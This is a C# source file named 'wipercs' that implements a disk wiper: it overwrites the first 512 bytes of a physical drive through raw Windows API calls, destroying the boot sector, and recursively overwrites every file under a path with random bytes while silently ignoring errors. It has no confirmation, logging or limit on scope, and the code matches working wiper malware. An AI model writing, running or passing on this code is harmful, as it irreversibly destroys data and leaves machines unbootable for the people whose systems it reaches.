namespace wipercs;

using System.Runtime.InteropServices;

public class Wiper
{
    private const uint GENERIC_WRITE = 0x40000000;
    private const uint FILE_SHARE_READ = 0x1;
    private const uint FILE_SHARE_WRITE = 0x2;
    private const uint OPEN_EXISTING = 0x3;
    
    [DllImport("kernel32.dll")]
    private static extern IntPtr CreateFile
    (
        string lpFileName,
        uint dwDesiredAccess,
        uint dwShareMode,
        IntPtr lpSecurityAttributes,
        uint dwCreationDisposition,
        uint dwFlagsAndAttributes,
        IntPtr hTemplateFile
    );
    
    [DllImport("kernel32.dll")]
    private static extern IntPtr WriteFile
    (
        IntPtr hFile,
        byte[] lpBuffer,
        uint nNumberOfBytesToWrite,
        out uint lpNumberOfBytesWritten,
        IntPtr lpOverlapped
    );

    public static bool PartWipe(int physicalDiskNumber)
    {
        string targetDrive = $"\\\\.\\PhysicalDrive{physicalDiskNumber}";
        byte[] buffer = new byte[512];
        try
        {
            var hDevice = CreateFile(
                targetDrive,
                GENERIC_WRITE,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                IntPtr.Zero,
                OPEN_EXISTING,
                0, IntPtr.Zero
            );

            WriteFile(
                hDevice, 
                buffer, 
                512, 
                out uint lpNumberOfBytesWritten, 
                IntPtr.Zero
            );
        }
        catch
        {
            return false;
        }

        return true;
    }

    private static byte[] ScrambleFile(long size)
    {
        byte[] buffer = new byte[size];
        Random rng = new Random();
        
        rng.NextBytes(buffer);

        return buffer;
    }

    private static void EraseHelper(string location)
    {
        const int chunkSize = 256 * 1024 * 1024;
        try
        {
            using (FileStream fStream = new FileStream(location, FileMode.Open, FileAccess.Write, FileShare.ReadWrite))
            {
                long fileSize = fStream.Length;

                if (fileSize < chunkSize)
                {
                    byte[] buffer = ScrambleFile(fileSize);
                    fStream.Write(buffer, 0, buffer.Length);
                }
                else
                {
                    long writeBuffer = 0;
                    while (writeBuffer < fileSize)
                    {
                        byte[] buffer = ScrambleFile(Math.Min(chunkSize, fileSize - writeBuffer));
                        fStream.Write(buffer, 0, buffer.Length);
                        writeBuffer += chunkSize;
                    }
                }
            }
        }
        catch
        {
            // give u p
        }
    }

    public static void DiskWipe(string path)
    {
        try
        {
            string[] files = Directory.GetFiles(path);
            foreach (string file in files)
            {
                EraseHelper(file);
            }
        }
        catch
        {
            //giveup
        }
        
        
        try
        {
            string[] sd = Directory.GetDirectories(path);
            foreach (var subd in sd)
            {
                DiskWipe(subd);
            }
        }
        catch
        {
        }
    }
}